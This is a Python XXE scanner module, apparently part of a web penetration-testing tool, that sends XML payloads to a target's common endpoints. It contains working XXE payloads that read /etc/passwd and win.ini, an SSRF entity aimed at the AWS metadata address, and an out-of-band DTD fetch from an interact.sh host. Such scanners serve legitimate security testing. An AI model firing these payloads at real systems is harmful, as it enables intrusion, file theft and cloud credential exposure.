#!/usr/bin/env python3
"""
XXE DTD Exfiltration Scanner
-----------------------------
Tests for out-of-band (OOB) XML External Entity injection using DTD exfiltration.
"""

import requests
import uuid
import re
from typing import List, Dict, Optional
from rich.console import Console

try:
    from modules.core.base_scanner import BaseScanner
except ImportError:
    BaseScanner = object

console = Console()


class XXEDTDScanner(BaseScanner if BaseScanner is not object else object):
    def __init__(self, target: str, session=None, timeout: int = 10):
        if BaseScanner is not object:
            super().__init__(target, session, timeout)
        else:
            self.target = target.rstrip("/")
            self.timeout = timeout
            self.session = session or requests.Session()
            self.session.verify = False
            self.results = []
        self.timeout = timeout
        self.session = session or requests.Session()
        self.session.verify = False
        self.results: List[Dict] = []
        # In a real scenario, this domain would be dynamically generated via interactsh
        self.interactsh_domain = "webpwn-test.interact.sh"

    def _post_xml(self, url: str, data: str) -> Optional[requests.Response]:
        if hasattr(self, "_post"):
            return self._post(
                url, data=data, headers={"Content-Type": "application/xml"}
            )
        try:
            return self.session.post(
                url,
                data=data,
                headers={"Content-Type": "application/xml"},
                timeout=self.timeout,
                verify=False,
            )
        except Exception:
            return None

    def _test_xxe_oob(self) -> Optional[Dict]:
        payload_id = uuid.uuid4().hex[:8]
        # Payload attempts to fetch an external DTD
        xml_payload = f"""<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://{payload_id}.{self.interactsh_domain}/xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
"""
        try:
            # Try common XML endpoints
            for path in ["/xml", "/api/xml", "/upload", "/import"]:
                url = self.target + path
                resp = self._post_xml(url, xml_payload)
                if resp and resp.status_code == 200:
                    # Check if the server attempted to parse the XML and returned a specific error
                    # indicating it tried to resolve the external entity.
                    if (
                        "java.net.UnknownHostException" in resp.text
                        or "failed to load external entity" in resp.text
                    ):
                        return {
                            "url": url,
                            "type": "XXE — Out-Of-Band DTD Parsing",
                            "severity": "critical",
                            "cvss": 9.1,
                            "detail": f"Server attempted to fetch external DTD. Blind XXE confirmed.",
                            "evidence": f"Error: {resp.text[:100]}",
                            "owasp": "A05:2021 – Security Misconfiguration",
                            "remediation": "Disable external entity parsing (DTD) completely in the XML parser.",
                        }
        except Exception:
            pass
        return None

    def _test_xxe_inband(self) -> List[Dict]:
        findings = []
        payloads = [
            # Linux file read
            (
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
                r"root:x:0:0:",
            ),
            # Windows file read
            (
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
                r"\[extensions\]",
            ),
            # SSRF via XXE (AWS metadata)
            (
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>',
                r"ami-id|instance-id",
            ),
        ]

        for path in ["/xml", "/api/xml", "/upload", "/import", "/"]:
            url = self.target + path
            for payload, sig in payloads:
                resp = self._post_xml(url, payload)
                if resp and re.search(sig, resp.text, re.IGNORECASE):
                    findings.append(
                        {
                            "url": url,
                            "type": "XXE — In-Band (Local File/SSRF)",
                            "severity": "critical",
                            "cvss": 9.8,
                            "detail": f"Server parses XML and reflects entity contents in response.",
                            "evidence": f"Pattern matched: {sig}. Snippet: {resp.text[:100]}",
                            "owasp": "A05:2021 – Security Misconfiguration",
                            "remediation": "Disable external entity parsing (DTD) completely in the XML parser.",
                        }
                    )
                    # Found one on this endpoint, move to next finding
                    break
        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ XXE DTD Exfiltration & In-Band Scanner on {self.target}[/bold yellow]"
        )

        inband_res = self._test_xxe_inband()
        for res in inband_res:
            if res not in self.results:
                self.results.append(res)
                console.print(f"  [bold red][!] {res['type']}[/bold red]")

        res = self._test_xxe_oob()
        if res:
            self.results.append(res)
            console.print(f"  [bold red][!] {res['type']}[/bold red]")
        else:
            console.print("  [green]No XXE DTD issue found[/green]")
        return self.results
